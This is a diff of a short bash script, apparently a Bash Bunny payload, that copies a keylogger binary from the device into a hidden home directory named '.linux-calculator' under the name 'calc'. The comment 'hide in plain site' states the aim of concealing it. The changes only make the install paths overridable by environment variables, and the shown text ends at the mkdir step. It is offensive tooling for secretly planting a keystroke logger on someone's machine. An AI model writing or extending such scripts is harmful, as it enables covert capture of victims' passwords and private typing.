@@ -1,12 +1,12 @@
 #!/bin/bash
 # hide in plain site
 
-INSTALL_DIR="/home/$USER/.linux-calculator"
-BIN_NAME="calc"
+INSTALL_DIR="${INSTALL_DIR:-/home/$USER/.linux-calculator}"
+BIN_NAME="${BIN_NAME:-calc}"
 SWITCH=switch1
 
 # path to keylogger binary can be overwritten with env variable
-KEYLOGGER="${VAR1:-/media/$USER/BashBunny/payloads/$SWITCH/keylogger}"
+KEYLOGGER="${KEYLOGGER:-/media/$USER/BashBunny/payloads/$SWITCH/keylogger}"
 
 # copy the keylogger from the BashBunny to the $INSTALL_DIR
 mkdir -p "$INSTALL_DIR"
